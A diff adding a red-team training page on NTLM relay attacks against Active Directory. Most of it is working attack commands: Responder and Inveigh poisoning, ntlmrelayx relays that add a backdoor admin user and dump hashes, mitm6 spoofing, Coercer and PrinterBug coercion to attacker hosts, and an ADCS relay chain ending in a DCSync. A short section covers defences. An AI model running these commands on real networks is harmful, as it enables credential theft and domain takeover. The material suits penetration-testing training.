@@ -1,0 +1,315 @@
+---
+import TrainingPage from '../../layouts/TrainingPage.astro';
+---
+<TrainingPage
+  title="NTLM Relay Attacks — Red Team Academy"
+  module="Active Directory"
+  tags={['llmnr', 'nbt-ns', 'responder', 'ntlmrelayx', 'mitm6']}
+  pageKey="ad-ntlm-relay"
+>
+  <h1>NTLM Relay Attacks</h1>
+
+        <h2>Overview</h2>
+        <p>NTLM relay attacks exploit the NTLM authentication protocol by intercepting authentication attempts and relaying them to other services before the victim can complete authentication directly. The attack chain typically starts with poisoning broadcast name resolution protocols (LLMNR, NBT-NS, mDNS) or DNS to capture authentication attempts, then relaying those credentials to target systems. This attack requires no prior credentials and is one of the most reliable ways to gain initial AD footholds.</p>
+
+        <div class="diagram-container">
+          <img src="/images/active-directory/ntlm-relay-flow.svg" alt="NTLM relay attack chain: victim authenticates to attacker via LLMNR poisoning, attacker relays to target SMB/LDAP server">
+          <div class="diagram-label">// ntlm relay flow — capture auth via LLMNR/NBT-NS, relay to target</div>
+        </div>
+
+        <h2>LLMNR and NBT-NS Poisoning</h2>
+        <p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are broadcast protocols that resolve hostnames when DNS fails. Any host on the local network can respond to these broadcasts — an attacker can respond with their own IP, causing the victim to authenticate to the attacker.</p>
+        <pre><code>># How the attack works:
+# 1. User types \\FILESERVER in Explorer (or a script/app does)
+# 2. DNS fails to resolve FILESERVER
+# 3. Windows sends LLMNR/NBT-NS broadcast: "Who is FILESERVER?"
+# 4. Responder answers: "I am FILESERVER" — victim connects to attacker
+# 5. Windows sends NTLMv2 challenge response (hash) to authenticate
+# 6. Attacker captures hash → crack offline OR relay to another service
+
+# Common triggers:
+# - Mistyped UNC paths (\\FILESERVE instead of \\FILESERVER)
+# - Applications hardcoded to non-existent shares
+# - Group Policy with invalid paths
+# - Browser attempting to authenticate to detected proxies</code></pre>
+
+        <h2>Responder — Capture NTLMv2 Hashes</h2>
+        <p>Responder poisons LLMNR, NBT-NS, and mDNS and presents fake authentication servers (SMB, HTTP, LDAP, etc.) to capture NTLMv2 hashes from victims on the local network segment.</p>
+        <pre><code>># Basic Responder run (on your network interface):
+sudo responder -I ens224
+# -I: interface connected to target network
+# Responder poisons LLMNR/NBT-NS and captures hashes
+
+# Analyze mode only (no poisoning — just listen):
+sudo responder -I ens224 -A
+
+# Enable more protocol poisoners:
+sudo responder -I ens224 -wv
+# -w: WPAD rogue server
+# -v: verbose
+
+# View captured hashes:
+cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
+
+# Crack captured NTLMv2 hashes with hashcat:
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+# Mode 5600 = NTLMv2 (NetNTLMv2)
+# Example hash format: DOMAIN\User::DOMAIN:Challenge:Response
+
+# IMPORTANT: Responder and ntlmrelayx cannot run simultaneously
+# on the same interface — they both need port 445
+# Turn off SMB/HTTP servers in Responder when using ntlmrelayx</code></pre>
+
+        <h2>ntlmrelayx — Relay Captured Credentials</h2>
+        <p>Rather than just capturing hashes to crack, relay them in real-time to a target system. If the target doesn't require SMB signing (most workstations don't), the relayed authentication succeeds. Impacket's <code>ntlmrelayx.py</code> handles the relay.</p>
+        <pre><code>># Prepare: disable SMB and HTTP in Responder config
+# Edit /etc/responder/Responder.conf:
+# SMB = Off
+# HTTP = Off
+
+# Build a targets file — SMB signing disabled hosts:
+# Scan with nmap or nxc:
+nxc smb 172.16.5.0/24 --gen-relay-list relay_targets.txt
+# Outputs hosts with SMB signing disabled
+
+# Start ntlmrelayx targeting the list:
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support
+# Relays captured auth to all hosts in the list
+# Default action: dump SAM database on each successful relay
+
+# Start Responder (SMB/HTTP off):
+sudo responder -I ens224 -rv
+# Responder poisons → victim authenticates → ntlmrelayx relays
+
+# When relay succeeds, you get SAM dump:
+# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+# Administrator:500:aad3b...:8846f...:::</code></pre>
+
+        <h2>ntlmrelayx Payloads</h2>
+        <p>ntlmrelayx can do more than dump SAM — it can execute commands, create users, or start an interactive shell on the relayed host.</p>
+        <pre><code>># Execute command on relay target:
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add"
+
+# Interactive SMB shell on relay target:
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
+# Opens interactive smbclient shell when relay succeeds
+# Connect to it: nc 127.0.0.1 11000
+
+# LDAP relay (relay to domain controller — create user):
+impacket-ntlmrelayx -t ldap://172.16.5.5 -smb2support --add-computer HACKER 'P@ssw0rd123!'
+# Adds a computer account to the domain (useful for RBCD attacks)
+
+# Relay to LDAPS (LDAP over SSL):
+impacket-ntlmrelayx -t ldaps://172.16.5.5 -smb2support
+
+# Dump domain hashes via relay to DC (if relaying Domain Admin creds):
+impacket-ntlmrelayx -t smb://172.16.5.5 -smb2support --no-http-server</code></pre>
+
+        <h2>IPv6 DNS Spoofing with mitm6</h2>
+        <p>Most corporate Windows environments have IPv6 enabled but no IPv6 DNS server configured. mitm6 exploits this: it responds to DHCPv6 requests and assigns itself as the IPv6 DNS server, then answers all DNS queries with the attacker's IP. Victims send NTLM authentication to the attacker.</p>
+        <pre><code>># mitm6 intercepts DHCPv6 and responds to IPv6 DNS queries
+# Victims get attacker's IP as their DNS server for IPv6 lookups
+# Windows prefers IPv6 over IPv4, so traffic comes to attacker
+
+# Install mitm6:
+pip3 install mitm6
+
+# Start mitm6 targeting the domain:
+sudo mitm6 -d corp.local
+# -d: target AD domain
+# mitm6 listens for DHCPv6 and WPAD requests
+
+# Simultaneously run ntlmrelayx for LDAP relay:
+impacket-ntlmrelayx -6 -t ldaps://172.16.5.5 -wh attacker-wpad.corp.local -l /tmp/loot
+# -6: use IPv6
+# -wh: WPAD hostname to respond to
+# -l: loot directory
+
+# Combined attack flow:
+# 1. mitm6 → victims use attacker as DNS → request WPAD from attacker
+# 2. Victims authenticate to attacker via NTLM (WPAD triggers auth)
+# 3. ntlmrelayx relays credentials to LDAPS → dumps AD info or adds objects
+
+# Verify mitm6 is capturing:
+# Look for: "Got a DHCPv6 request from ..." and "Sent spoofed reply to ..."</code></pre>
+
+        <h2>Inveigh — LLMNR/NBT-NS Poisoning from Windows</h2>
+        <p>When operating from a Windows attack host, Inveigh performs the same LLMNR/NBT-NS poisoning as Responder. Both a PowerShell version and a compiled C# binary (InveighZero) are available. The C# version is actively maintained and supports an interactive console for real-time hash retrieval.</p>
+        <pre><code># PowerShell version:
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+# Y = enable LLMNR spoofing, -NBNS Y = enable NetBIOS spoofing
+# Hashes written to C:\Tools\ by default
+
+# C# version (InveighZero) — runs with defaults (LLMNR + DNS + LDAP + SMB sniff):
+.\Inveigh.exe
+
+# While running, press ESC to enter interactive console:
+# Useful console commands:
+GET NTLMV2          # show all captured NTLMv2 hashes
+GET NTLMV2UNIQUE    # one hash per unique user
+GET NTLMV2USERNAMES # show usernames + source IPs
+GET CLEARTEXT       # show any captured cleartext credentials
+STOP                # stop Inveigh
+
+# Stop from PowerShell (outside interactive console):
+Stop-Inveigh</code></pre>
+
+        <h2>Responder — Full Options Reference</h2>
+        <pre><code># Key Responder flags:
+sudo responder -I ens224              # basic — listen and poison all requests
+sudo responder -I ens224 -A           # analyze mode (no poisoning — passive)
+sudo responder -I ens224 -wf          # -w: WPAD rogue proxy, -f: fingerprint OS
+sudo responder -I ens224 -v           # verbose (more data to console)
+
+# Required ports (must be available):
+# UDP: 137, 138, 53, 389, 1434, 5355, 5353
+# TCP: 80, 135, 139, 445, 21, 25, 110, 587, 1433, 3128, 3141
+
+# Hashes saved to: /usr/share/responder/logs/
+# Format: SMB-NTLMv2-SSP-[CLIENT_IP].txt
+# Also stored in SQLite DB (/usr/share/responder/Responder.db)
+
+# Crack captured NTLMv2 hashes (mode 5600):
+hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.25.txt /usr/share/wordlists/rockyou.txt
+
+# NOTE: Disable SMB/HTTP in Responder.conf when running ntlmrelayx:
+# Edit /etc/responder/Responder.conf → SMB = Off, HTTP = Off</code></pre>
+
+        <h2>Defenses Against NTLM Relay</h2>
+        <p>Understanding defenses helps you explain findings and identify when signing is in place (which will block relay attacks).</p>
+        <pre><code>># Check SMB signing status:
+nxc smb 172.16.5.0/24 --gen-relay-list /dev/stdout
+# Hosts with "signing:False" are relay targets
+# Hosts with "signing:True" will reject relayed authentication
+
+# Disable LLMNR (Group Policy):
+# Computer Config → Admin Templates → Network → DNS Client
+# → Turn off multicast name resolution → Enabled
+
+# Disable NBT-NS (per adapter via PowerShell):
+$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object &#123;$_.IPEnabled&#125;
+$adapters | ForEach-Object &#123; $_.SetTcpipNetbios(2) &#125;
+# 2 = Disable NetBIOS over TCP/IP
+
+# Enable SMB signing (Group Policy):
+# Computer Config → Windows Settings → Security Settings
+# → Local Policies → Security Options
+# → Microsoft network client: Digitally sign communications (always) → Enabled
+
+# Block NTLM entirely (high impact — test first):
+# Computer Config → Windows Settings → Security Settings
+# → Local Policies → Security Options
+# → Network security: LAN Manager authentication level → NTLMv2 only, refuse LM and NTLM</code></pre>
+
+        <h2>Print Spooler Bug (PrinterBug) and NTLM Relay</h2>
+        <p>The Windows Print Spooler service (enabled by default on all Windows versions) can be abused to coerce a remote machine into authenticating to an attacker-controlled host. This "PrinterBug" uses RpcRemoteFindFirstPrinterChangeNotification(Ex) to force a target to authenticate — carrying a TGT in the process. Microsoft considers this "by design" and will not fix it.</p>
+        <pre><code>># Relay PrinterBug auth to another DC for DCSync (requires SMB Signing disabled):
+
+# Step 1: Configure ntlmrelayx to forward to DC2 and perform DCSync:
+impacket-ntlmrelayx -t dcsync://DC2_IP -smb2support
+
+# Step 2: Trigger the PrinterBug from Kali using dementor.py:
+python3 ./dementor.py ATTACKER_IP TARGET_DC_IP -u bob -d domain.local -p Password123
+
+# When successful, ntlmrelayx dumps domain credential hashes via DCSync
+
+# Prevention: Disable Print Spooler on servers that don't need it.
+# Or disable remote access via registry:
+# HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers
+# RegisterSpoolerRemoteRpcEndPoint = 2 (disabled for remote clients)
+
+# Detection: Unexpected dropped outbound connections to ports 139/445 from DCs
+# In DC relay attack: Event 4624 for DC$ account originating from attacker IP (not DC's IP)</code></pre>
+
+        <h2>Coercing Attacks and Unconstrained Delegation</h2>
+        <p>The Coercer tool exploits all known vulnerable RPC functions simultaneously to coerce a DC into authenticating back to an attacker-controlled machine. When combined with an Unconstrained Delegation server, the coerced DC's TGT is cached on that server and can be exported to perform DCSync or other domain-level attacks.</p>
+        <pre><code>># Identify systems with Unconstrained Delegation:
+Get-NetComputer -Unconstrained | select samaccountname
+# DC$ are trusted by default — look for non-DC machines like SERVER01, WS001
+
+# Step 1: On the UD server (already compromised) — monitor for new TGTs:
+.\Rubeus.exe monitor /interval:1
+
+# Step 2: From Kali — run Coercer to force DC to authenticate to the UD server:
+Coercer -u bob -p Password123 -d domain.local -l ws001.domain.local -t dc1.domain.local
+
+# Step 3: Rubeus shows new TGT for DC1$@DOMAIN.LOCAL — pass the ticket:
+.\Rubeus.exe ptt /ticket:BASE64_TICKET
+
+# Step 4: DCSync with the DC$ ticket:
+.\mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator"
+
+# Prevention options:
+# 1. Third-party RPC firewall (zero networks) — block dangerous RPC OPNUMs
+# 2. Block DCs from outbound ports 139/445 except to other DCs</code></pre>
+
+        <h2>Coercer — Protocol Scanning &amp; Filtering</h2>
+        <p>Coercer unifies 20+ Windows RPC coercion techniques (MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP, etc.) into a single framework. Before blindly coercing, scan the target to discover which protocols are accessible — this avoids generating unnecessary noise from failed attempts.</p>
+        <pre><code># Scan a target to discover available coercion methods
+coercer scan -u user -p password -d domain.local -t dc.domain.local
+
+# Sample output:
+# [+] MS-RPRN  — RpcOpenPrinter            — available
+# [+] MS-DFSNM — NetrDfsAddStdRoot         — available
+# [-] MS-EFSRPC — EfsRpcOpenFileRaw        — patched / unavailable
+
+# Coerce using only a specific protocol
+coercer -u user -p password -d domain.local \
+  -t dc.domain.local -l attacker-ip \
+  --filter-protocol-name MS-RPRN
+
+# Try multiple specific protocols
+coercer -u user -p password -d domain.local \
+  -t dc.domain.local -l attacker-ip \
+  --filter-protocol-name MS-RPRN,MS-DFSNM
+
+# Bulk coercion from a target list
+coercer -u user -p password -d domain.local \
+  -tf targets.txt -l attacker-ip
+
+# List all available coercion methods built into Coercer
+coercer --list-methods</code></pre>
+
+        <h2>Coercer + ADCS WebDAV Relay Chain</h2>
+        <p>When ADCS HTTP enrollment is available, coerce the DC over WebDAV (HTTP) instead of SMB. This avoids the SMB signing requirement and allows relaying the machine account authentication to the certificate authority to obtain a DC certificate — which can then be used to DCSync the entire domain.</p>
+        <pre><code># Full chain: Coercer → HTTP relay → ADCS certificate → domain compromise
+
+# Step 1: Confirm ADCS web enrollment is running
+curl -I http://ca-server/certsrv/
+
+# Step 2: Terminal 1 — relay to ADCS HTTP endpoint
+impacket-ntlmrelayx \
+  -t http://ca-server/certsrv/certfnsh.asp \
+  -smb2support \
+  --adcs \
+  --template DomainController
+
+# Step 3: Terminal 2 — coerce DC via WebDAV (HTTP auth, bypasses SMB signing)
+coercer -u lowpriv -p password -d domain.local \
+  -t dc.domain.local -l attacker-ip \
+  --webdav-host attacker.com \
+  --always-continue
+
+# Step 4: ntlmrelayx obtains a base64-encoded DC certificate
+# Save it to dc.pfx
+
+# Step 5: Authenticate as DC using the certificate
+certipy auth -pfx dc.pfx -dc-ip dc-ip
+
+# Step 6: DC machine account TGT obtained — use for DCSync via S4U2Self
+impacket-secretsdump -k -no-pass dc.domain.local
+
+# GOAD example — from low-priv samwell.tarly to domain compromise:
+# Terminal 1:
+impacket-ntlmrelayx \
+  -t http://192.168.56.23/certsrv/certfnsh.asp \
+  --adcs --template DomainController -smb2support
+
+# Terminal 2:
+coercer -u samwell.tarly -p Heartsbane \
+  -d north.sevenkingdoms.local \
+  -t winterfell.north.sevenkingdoms.local \
+  -l 192.168.56.100 \
+  --webdav-host 192.168.56.100 --always-continue</code></pre>
+</TrainingPage>
